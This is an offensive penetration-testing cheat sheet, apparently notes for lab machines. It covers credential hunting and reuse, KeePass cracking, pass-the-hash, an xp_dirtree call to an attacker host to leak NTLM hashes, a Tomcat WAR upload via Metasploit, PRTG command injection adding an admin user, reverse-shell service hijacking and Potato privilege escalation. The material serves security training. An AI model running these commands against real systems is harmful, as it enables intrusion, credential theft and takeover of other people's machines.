**Credential Disclosure & Reuse**

- **Enumeration:**
    - **File System:** Look for specific files mentioned: `web.config`, `PRTG Configuration.ini`, `Users.xml`, KeePass databases (`.kdbx`), Excel files (`.xlsx`).
        
        Bash
        
        ```
        # Linux
        find / -name "web.config" -o -name "PRTG Configuration.ini" -o -name "Users.xml" -o -name "*.kdbx" -o -name "*.xlsx" 2>/dev/null
        # Windows
        dir /s C:\web.config C:\"PRTG Configuration.ini" C:\Users.xml C:\*.kdbx C:\*.xlsx /b
        ```
        
    - **FTP/SMB Shares:** Check for the presence and content of these specific files on shared resources.
        
        Bash
        
        ```
        # FTP (see previous example for connecting and listing)
        # Download and then examine the files: get <filename>
        # SMB (see previous example for connecting and listing)
        # Type the files directly: type \\<target_ip>\<share_name>\<filename>
        ```
        
- **Exploitation:**
    - **Plaintext Reuse:** If plaintext credentials are found in these files, try them for:
        
        - Windows logins (RDP, SMB).
        - SSH logins.
        - Web application logins.
        - Database logins (if a database server is running).
        
        Bash
        
        ```
        # Example SSH
        ssh chris@<target_ip>
        # Example RDP (using tools like rdesktop or Remmina)
        # rdesktop <target_ip> -u chris -p <password>
        ```
        
    - **KeePass Database Cracking:** If a `.kdbx` file is found, attempt to extract and crack the master hash using tools like `keepass2john`.
        
        Bash
        
        ```
        # Linux
        keepass2john <jeeves.kdbx> > keephashes.txt
        john --wordlist=/usr/share/wordlists/rockyou.txt keephashes.txt
        # If cracked, use the master password to open the database and retrieve stored credentials.
        ```
        
    - **Pass-the-Hash:** If an Administrator NTLM hash is recovered from the KeePass database, use tools like `psexec.py` to authenticate.
        
        Bash
        
        ```
        # Example using psexec.py
        ./psexec.py Administrator@<target_ip> -hashes <LM_hash>:<NT_hash> cmd.exe
        ```
        
    - **SQL Credential Abuse:** If SQL credentials are found in the Excel file, use them to connect to the SQL server and potentially use extended stored procedures like `xp_dirtree` to leak Net-NTLM hashes.
        
        SQL
        
        ```
        -- Example connecting with sqlcmd (if available)
        sqlcmd -S <target_ip> -U <sql_username> -P '<sql_password>'
        -- Example using xp_dirtree to leak Net-NTLM hash (requires appropriate permissions)
        EXEC master.dbo.xp_dirtree '\\attacker_ip\share', 1, 1;
        ```
        
    - **GPP `cpassword` Decryption:** If `Groups.xml` files are found in the Group Policy History, look for the `cpassword` attribute and decrypt it.
        
        PowerShell
        
        ```
        # Example (if you have local access and can read the file)
        Get-ChildItem -Path "C:\ProgramData\GroupPolicy\History\*" -Filter "*Groups.xml" -Recurse | Select-String -Pattern "cpassword"
        # Use a tool like gpp-decrypt (or a PowerShell script) to decrypt the password.
        # gpp-decrypt <base64_encoded_password>
        ```
        

**II. Exploiting Vulnerable Services & Applications (Specific to Mentioned Services)**

- **Enumeration:**
    - **Port Scan:** Identify if Tomcat (port 8080), Jenkins (port 8080 or others), AChat server (specific port), PRTG Network Monitor (port 80 or 443), or NSClient++ (port 12489) are running.
        
        Bash
        
        ```
        nmap -sC -sV <target_ip> -p 80,443,8080,12489 # Add other potential ports
        ```
        
    - **Web Browsing:** Navigate to web interfaces (Tomcat Manager, Jenkins) to check for login prompts or unauthenticated access.
    - **Service Configuration Files (if accessible):** Look for `tomcat-users.xml` (Tomcat), `config.xml` (Jenkins), `nsc.ini` (NSClient++).
- **Exploitation:**
    - **Tomcat Default Credentials:** Try `tomcat:s3cret` on the `/manager/html` interface. If successful, deploy a malicious WAR file for RCE.
        
        Bash
        
        ```
        # Using Metasploit (example from previous response)
        msfconsole
        use exploit/multi/http/tomcat_mgr_upload
        set RHOSTS <target_ip>
        set RPORT 8080
        set USERNAME tomcat
        set PASSWORD s3cret
        set RFILE /path/to/your/malicious.war
        exploit
        ```
        
    - **Jenkins Script Console:** If unauthenticated access to Jenkins is available (e.g., `/script`), execute OS commands directly.
        
        Groovy
        
        ```
        // Groovy script to execute a command
        def proc = "whoami".execute()
        println proc.text
        ```
        
    - **AChat Buffer Overflow (CVE-2015-1578):** Use a known exploit for this vulnerability (search on Exploit-DB or use Metasploit if available).
    - **PRTG Command Injection:** After logging into the PRTG web interface (potentially with found credentials), look for notification settings and attempt to inject commands in relevant fields.
        
        ```
        # Example (the exact parameter might vary)
        # In a notification setting, try something like:
        # C:\Windows\System32\cmd.exe /c net user attacker pass /add && net localgroup Administrators attacker /add
        ```
        
    - **NSClient++ External Script Execution:** If you find the NSClient++ admin password in `nsc.ini`, you can use the `nscp.exe` client (or similar tools) to execute local scripts.
        
        Bash
        
        ```
        # Example using nscp.exe (syntax might vary)
        nscp.exe -server <target_ip> -port 12489 -password <nsc_password> -command "<your_script>"
        # Or using the check_nt plugin with specific arguments
        # check_nt -H <target_ip> -p 12489 -s <nsc_password> -v USEQ -l "<script_path> <arguments>"
        ```
        
    - **Unquoted Service Path (UniFi Video - `taskkill.exe`):** If the UniFi Video service is running with an unquoted path to `taskkill.exe`, create a malicious `taskkill.exe` in `C:\ProgramData\unifi-video\` and restart the service.
        
        PowerShell
        
        ```
        # Create malicious taskkill.exe (e.g., a reverse shell)
        # (Use msfvenom or similar to create the executable)
        # Copy it to C:\ProgramData\unifi-video\
        copy malicious_taskkill.exe C:\ProgramData\unifi-video\taskkill.exe
        # Restart the UniFi Video service
        net stop UniFiVideo
        net start UniFiVideo
        ```
        
    - **SeImpersonatePrivilege Abuse ("Potato" attacks):** If the initial shell on the `Bounty` box has `SeImpersonatePrivilege` enabled, use tools like `JuicyPotato.exe` or `RottenPotato.exe` to escalate to SYSTEM.
        
        ```
        # Upload the appropriate Potato exploit for the OS version
        # Execute it with the correct parameters to spawn a SYSTEM shell
        JuicyPotato.exe -l 9002 -p cmd.exe -t t -c {CLSID} # Example (CLSID depends on the target)
        ```
        
    - **Malicious `.CHM` File:** If you can get an administrator to open a crafted `.CHM` file (e.g., by placing it in a writable location for the `chris` user on `Sniper`), it can execute commands. The creation of such a file typically involves using `HTML Help Workshop` and embedding a malicious URL or script handler.

